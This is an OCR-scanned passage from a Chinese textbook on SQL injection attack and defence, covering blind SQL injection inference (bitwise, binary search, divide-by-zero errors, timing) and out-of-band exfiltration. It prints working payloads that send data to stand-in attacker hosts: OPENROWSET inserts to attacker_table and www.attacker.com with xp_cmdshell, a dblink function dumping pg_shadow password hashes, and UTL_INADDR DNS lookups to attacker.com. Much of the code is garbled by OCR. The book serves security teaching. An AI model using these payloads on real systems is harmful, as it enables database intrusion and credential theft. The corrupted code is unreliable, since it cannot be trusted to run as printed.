能通过某些条件来引发查询失败。可通过结合使用除数为0的子句和CASE条件来实现该目的：
ASCII (SUBSTRING (SYSTEM_USER, I , 1)) > k THEN CAST (1/0 AS CHAR) END)
只有当第i个字节的第k位为1时才会会试执行带下划线的除式，并允许您推断状态。
5.4.4Oracle响应技术
Oracle 中基于响应的利用在结构上与MySQL、PostgreSQL和 SQL Server中的相似。但对
211
---
## Page 226
SQL注入攻击与防御（第2版）
于关键信息位（bit），显然它们依赖于不同的函数。例如，为了确定数据库用户是否为DBA，下
列SQL查询会在条件为真时返回行，面在条件为假时不返回任何行：
RENV*, ′ISDBA′)=′TRUE′;
同理，可以写一个逐位推断，根据第二个注入谓词是否返回结果来测试状态：
AND BITAND (ASCII (SUBSTR ( () ,1, 1)) , 2°) =2
二分搜索的格式为：
SELECT * FROM reviews WHERE review_author=*MadBob* AND ASCII (SUBSTR(("*),
 ,1)) > k
还可以使用Oracle的字符串连接技术来确保在函数或过程参数列表中安全地使用，该技术
f,11 (TNG NO8a GN3
上述代码只有在推断测试返回真时才会产生完整的MadBob字符串。
最后，我们还可以使用除数为0子句来产生运行时错误，这与SQLServer中的操作相似。
下面是一段简单的代码，它在拆分与平衡过的逐位方法中包含了一个0除数：
MadBob*I1 (SELECT CASE WHEN BITAND( (ASCII (SUBSTR((**) , I , 1)) 2′)2
THEN CAST (1/0 AS CHAR) ELSE ** END FROM DUAL) 11′ ;
请注意，必须使用CASTO来封装除式，否则查询会一直因语法错误而失败。当推断问题
在运行在ApacheTomcat上的易受攻击页面中返回TRUE时，会抛出一个未捕获异常，产生图
5-10所示的HTTP500服务器错误。
000
Apache Tomcat/5.5.27 Errorneport
 Q- Coog
HTTPStatus500-
T Exceton rtg9t
org,apache Sasper ?ssperxoept Los: 0RA01476: 4ivLser is equa1 to rere
aache.
javax-servet.ttp.tperviet.aevise(ttpbeiet.a.29)
javax-servlet-ServletBxeeptios: 08A=0147%6: divisor Is equal to 2er0
mloAleadamuLokSxs
suLooLEasC
图5-10由0除数引发的Oracle未捕获异常
212
---
## Page 227
第5章SQL盲注利用
5.4.5返回多位信息
到目前为止，我们介绍的推断攻击技术主要关注的是获取单个位或字节的状态，依据的是
推断间题是返回TRUE 还是FALSE。事实上，两个状态只允许每个请求提取一个信息位。如果
存在多种状态，每个请求可以提取更多的位，这样可以提高通道的带宽。每个请求可提取的位
数为logn，其中n为请求可能的状态数。以具体数字计算，要想返回2位，每个请求需要4
种状态：要想返回3位，每个请求需要8种状态：要想返回4位，每个请求需要16种状态，
依此类推。如何为一个请求引入更多的状态呢？在某些情况下，就像不可能在所有易受攻击的
注入点中都存在SQL盲注一样，也是不可能引入更多状态的，但通常可以提取多个位。对于
使用时间方法或内容方法回答推断间题的情况，引入的状态可超过两种。
到目前为止，逐位方法已经询问了第i个字节的第j位是否为1。如果存在4种状态，那
么推断问题可以是这样一些形式：询问从第i个字节的第j位开始的两位是否为00、01、10或
11。如果使用时间作为推断方法，可将上述问题解析成下列 SQL ServerCASE语句：
CASE
WHEN ASCII (SUBSTRING ( (**) , I, 1)) & (2′ +2J*) = 0
THEN WAITFOR DELAY *00:00: 00*
WHEN ASCII (SUBSTRING(() , 1, 1)) s (2′ +2J*) = 2)
THEN WAITFOR DELAY *00:00: 05*
WHEN ASCII (SUBSTRING ( (*) ,  , 1)) & (2′+2J*1) = 2J*1
ELSE
THEN WAITFOR DELAY *00: 0O:15*
END
这看起来似乎并没有什么特别之处。最坏情况下（位串为11)，CASE语句会产生一个15秒
的延迟，这比每次使用5秒延迟提取一位花费的时间要长，但对于平均分布的数据而言，平均
延迟会小于10秒。最明显的是由于该方法要求的请求数更少，因而花费在请求提交和响应传
输上的总时间会更少，另外通过异常请求检查的次数也减少了。
增加状态数量的另一种方法是修改WHERE子句中的搜索项，例如显示4种可能结果中的
一种，从面推断位字符串：
SELECT * FROM reviews WHERE review_author=** + (SELECT
CASE
WHEN ASCII (SUBSTRING ( (), I , 1)) & (2′ +2J**)  0
'KadBob *
WHEN ASCII (SUBSTRING ( () ,  1 , 1)) & (2′ +2)*1) = 2”
'Hogarth'
WHEN ASCII (SUBSTRING ( () ,  I, 1)) & (2′ +2J*1) = 2*
'Jag′
ELSE
'Eliot'
END)
搜索结果与MadBob相匹配时，推断位串为00：与Hogarth'相匹配时，推断位申为'01’：与
Jag相匹配时，推断位串为'10：与Elior相匹配时，推断位串为'11
213
---
## Page 228
SQL注入攻击与防御(第2版）
上述代码中的两条CASE语句讲解了如何改进逐位方法。也可以对二分搜索进行改进。二
分搜索的主要缺点是只能测试一种关系，即“大于”。假设所检查字节的ASCII值为127。提
问的第一个推断问题是：“127是否大于127？”。答案为FALSE，这样就必须再进一步提问7
求里包含两个问题。可通过一条CASE语句实现该目的，该CASE语句结合一条能产生错误的
除数为0子句来实现二分搜索方法：
CASE
WHEN ASCII (SUBSTRING ((-) ,1, 1)) >k
WHEN ASCII (SUBSTRING(("**) , 1, 1)) = k
THEN 1/0
ELSE
THEN XAITFOR DELAY *00:00: 00*
END
如果观察到错误，就说明i-k：如果请求延迟了5秒，就说明i>k，否则i<k。
5.5使用非主流通道
使用SQL盲注漏润检索数据时使用的第二类技术是利用非主流带外通道。与依靠推断技术
获取数据不同，除了HTTP响应外，我们还可以使用通道来获取数据块。由于通道倾向于依赖
数据库支持的功能，因此它并不适用于所有的数据库。比如说，DNS是一种可用于PostgreSQL、
SQL Server 和 Oracle 的通道，但它不适用于MySQL。
我们将讨论4种独立的针对SQL自注的非主流通道：数据库连接、DNS、e-mail和HTTP。
最基本的思想是先将SQL查询结果打包，之后再使用3种非主流通道之一将结果回送给攻击者。
5.5.1数据库连接
第一种非主流通道针对MicrosoftSQLServer，攻击者可通过它来创建从受害者数据库到攻
击者数据库的连接，并通过该连接传递查询的数据。可使用OPENROWSET命令实现该目的，
通道可用时，它将成为攻击者的得力助手。要想攻击成功，攻击者必须能够在受害者数据库上
打开一条通向攻击者数据库的TCP（传输控制协议）连接，默认使用的是1433端口。如果受害者
机器上配有出口过滤功能，或者攻击者正在执行出口过滤，那么连接就会失败。只需修改目的
IP地址后面的端口号即可连接到其他端口。当远程数据库服务器只能在几个端口上回连到攻击
者机器时，该技术会非常有用。
在SQLServer中，可使用OPENROWSET来执行与远程OLEDB数据源（例如，另外一个
SQLServer)的一次性连接。合法使用OPENROWSET的例子是：将检索远程数据库上的数据作
为连接两个数据库的手段，尤其适用于需要定期交换数据的场合。常用的调用OPENROWSET
的方法如下所示：
SELECT * FROM OPENROWSET(′SQLOLEDB′, *NetWOrk=DBMSSOCN;
Address=10.0.2.2;uid=sa; pvd=Mypassword*,
214
---
## Page 229
第5章SQL盲注利用
*SELECT review_author FROM reviews*)
这里我们作为sa用户连接到地址为10.0.2.2的SQLServer并执行SELECTreview_author
FROMreviews 查询，该查询的结果将返回并传递给最外层的查询。用户 sa是地址为10.0.2.2
的数据库的一个用户，而不是执行OPENROWSET的数据库用户。另外要注意，要想作为sa
用户成功执行该查询，我们必须提供正确的口令以便成功实现验证。
第4章介绍过OPENROWSET，我们这里关注的是它在SQL盲注中的应用。虽然在上面
的例子中是使用SELECT语句从外部数据库检索结果，但是也可以使用OPENROWSET并借
助INSERT语句来向外部数据库传递数据：
INSERT INTO OPENROWSET (*SQLOLEDB', *NetwOrk=DBMSOCN,
Address=192.168.0.1;uid=foo: pwd=password′, *SELECr * FROM
attacker_table*) SELECT name FROM sysobjects WHERE xtype=*U*
我们通过执行该查询来选取本地数据库中用户表的名字，并将这些行插入到位于攻击者服
务器(IP地址为192.168.0.1）上的 attacker_table表中。当然，要保证该命令正确执行，attacker_table
表中的列必须与本地查询的结果相匹配，所以该表中包含了一个varchar单列。
很明显，这是个很好的非主流通道的例子，我们可以执行SQL，它会产生结果并将结果实
时传递给攻击者。由于通道完全独立于页面响应，因面对SQL盲注漏润来说，OPENROWSET是
理想之选，工具的作者们已经认识到这一点，至少两款公共工具的利用技术是依靠OPENROWSET
实现的。一款是Cesar Cemudo开发的 DataThicf，另一款是Nmonkee开发的 BobCat。第一款工具
是一种概念验证工具，它说明了OPENROWSET的威力：第二款工具借助GUI降低了执行
OPENROWSET攻击的复杂性。
该技术并不局限于数据。如果拥有管理员权限并重新启用了xp_cmdshell扩展存储过程（请
参阅第6章以获取该主题的更多信息），还可以使用上述攻击获取命令的输出结果，这些命令
在操作系统层执行。例如，下列查询将使目标数据库发送C：路径下的文件和目录列表：
INSERT INTO OPENROWSET (′SQLOLEDB', *Network=DBMSSOCN;
Address=www.attacker.com:80; uid=sa; pwd=53kr3t',*SELECT * FROM
table*) ExEC master..xp_cmdshell *dir C:\*
Oracle也支持创建数据库连接，但是这些语句不能嵌入到其他查询中，因此限制了数据库
连接的用途。
另外，PostgreSQL数据库驱动程序通常可以接受堆叠查询。在PostgreSQL9.1或更高版本
中，数据库超级用户(superuser)可以使用下面的语句启用dblink扩展：
CREATE EXTENSION db1ink;
在启用dblink扩展之后，就可以充分利用dblink系列命令从攻击者数据库向由攻击者控制
的PostgreSQL数据库实例复制数据。但是这些函数仅对行进行操作，而不是对结果集进行操
作。如果按照这种方式，请先准备好编写依靠游标（cursor)遍历数据的PL/pgSQL函数。下面是
一个简单的例子，它转储了数据库用户及其散列后的密码：
CREATE OR REPLACE FUNCTION dumper () RETURNS void AS $$
DECLARE
rvar record;
215
---
## Page 230
SQL注入攻击与防御(第2版)
BEGIN
FOR rvar in SELECT usenamel1*, *IIpasswd as c FROM pg_shadow
LOOP
PERFORM db1ink_exec (*host=172.16. 0,100 dbname=db user=uname
password=Pass*, *insert into dumper values(***l|rvar,clI***) *) ;
END LOOP;
END;
r,tbebdtd, 3ovnonv $$
5.5.2DNS渗漏
作为最出名的非主流通道，DNS 不仅用作 SQL注入漏洞的标记，面且作为传输数据的通
道。DNS包含下列优点：
·网络只有入口过滤面没有出口过滤时，或者仅有TCP出口过滤时，数据库可直接向攻
击者发送DNS请求，
·DNS 使用的是UDP(UserDatagramProtocol，用户数据报协议，一种无状态需求协议)，
可以“发完后不管”。如果未收到数据库发送的查找请求的响应，那么至多产生一个
非致命错误条件。
·DNS的层级设计意味着易受攻击的数据库不必直接向攻击者发送包。中间的DNS服
务器一般就能在数据库的支持下传输流量。
·执行查找时，数据库默认情况下会依赖于配置在操作系统内部的DNS服务器，该操作
系统通常是基本系统安装的关键部分。因此，除被严格限制的网络外，数据库可以在
大多数网络中发起受害者网络中存在的DNS查找。
DNS的缺点是：攻击者必须对在某一区域（本例中为“attacker.com”）内进行了验证注册的
DNS服务器拥有访问权。在该区域内，攻击者可以监视对服务器执行的所有查找。通常可通过
监视查询日志或运行tcpdump（最经典的网络监控和数据捕获噢探器）来实现该监视。
PostgreSQL、SQL Server和 Oracle 均能够直接或间接引发DNS 请求。在Oracle中，可以
使用UTL_INADDR包，这个包包含一个明确用于查找转发条目(forward cntry)的 GET_HOST_
ADDRESS函数和一个用于查找逆向条目的GET_HOST_NAME函数：
OTL_INADDR.GET_EOST_ADDRESS (*www.victim. Com*)
返回192.168.1.0
OTL_INADDR, GET_HOST_&AME (*192.16B.1 .0*)
返 ww, victim.com
这些函数比前面介绍的DBMS_LOCK.SLEEPO函数更有用，因为DNS函数不需要PL/SQL
块，因而可以将它们插入到子查询或谓词中，下面的例子展示了怎样通过谓词插入来提取数据
库登录用户：
SELECT * FROM reViews WHERE review_author=UTL_INADDR,GET_HOST_
ADDRESS( (SELECT USER FROM DUAL) I1*, attacker,Com′)
PostgreSQL不支持直接查找，但是可以通过其XML解析库的一个小技巧来初始化DNS
查询。读者可能知道，针对XML解析器的XML实体(XMLentity)注入攻击是一种早期的攻击
方式。对PostgreSQL数据库使用这种攻击技术，可以使之产生DNS查找。在下面的例子中，
将一个包含数据库用户名的查找发送给DNS服务器，以查找attacker.com：
SELECT XMLPARSE(document '<?xml version=*1.0" encoding=*ISO-8859-
216
---
## Page 231